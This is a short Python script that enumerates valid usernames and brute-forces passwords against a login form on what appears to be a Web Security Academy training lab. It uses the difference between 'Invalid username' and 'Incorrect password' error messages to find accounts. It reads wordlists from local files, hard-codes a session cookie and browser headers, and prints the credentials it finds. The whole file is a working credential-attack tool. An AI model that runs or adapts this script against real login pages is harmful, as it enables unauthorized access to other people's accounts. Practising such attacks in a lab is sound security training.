import requests

url = "https://0a8000dd046d4a7c804e3f3400af00b2.web-security-academy.net:443/login"
cookies = {"session": "K7j8UVJgBjFUqNvtO6FsjR4KFzg19uge"}
headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"macOS\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36", "Origin": "https://0a8000dd046d4a7c804e3f3400af00b2.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0a8000dd046d4a7c804e3f3400af00b2.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-EG,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5,fr;q=0.4", "Connection": "close"}

usernames = open("/Users/mohamed/Desktop/username.txt", "r")
passwords = open("/Users/mohamed/Desktop/password.txt", "r")
correct_username = ""
correct_password = ""
for username in usernames:
    valid_username = username.strip("\n")
    data = {"username": f"{valid_username}", "password": "test"}
    r = requests.post(url, headers=headers, cookies=cookies, data=data)
    if "Invalid username" not in r.text:
        correct_username = valid_username 
        for password in passwords:
            valid_password = password.strip("\n")
            data1 = {"username": f"{valid_username}", "password": f"{valid_password}"}
            r = requests.post(url, headers=headers, cookies=cookies, data=data1)
            if "Incorrect password" not in r.text:
                correct_password = valid_password
                break
        break

print(f"Log in with username: {valid_username} and password: {correct_password}")



